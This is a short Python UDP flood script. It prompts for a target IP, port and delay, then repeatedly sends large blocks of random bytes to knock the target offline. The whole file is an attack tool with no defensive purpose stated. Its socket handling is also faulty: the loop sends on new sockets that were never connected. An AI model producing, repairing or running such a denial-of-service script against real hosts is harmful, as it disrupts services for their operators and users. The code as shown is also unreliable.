import socket, random, time
 
socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
ip = input("Enter Target IP: ")
port = int(input("Enter Target Port: "))
sleep = float(input("Sleep: "))
 
socket.socket(socket.AF_INET, socket.SOCK_DGRAM).connect((ip, port))
 
for i in range(1, 100**1000):
    socket.socket(socket.AF_INET, socket.SOCK_DGRAM).send(random._urandom(10)*1000)
    print(f"Send: {i}", end='\r')
    time.sleep(sleep)
    
 
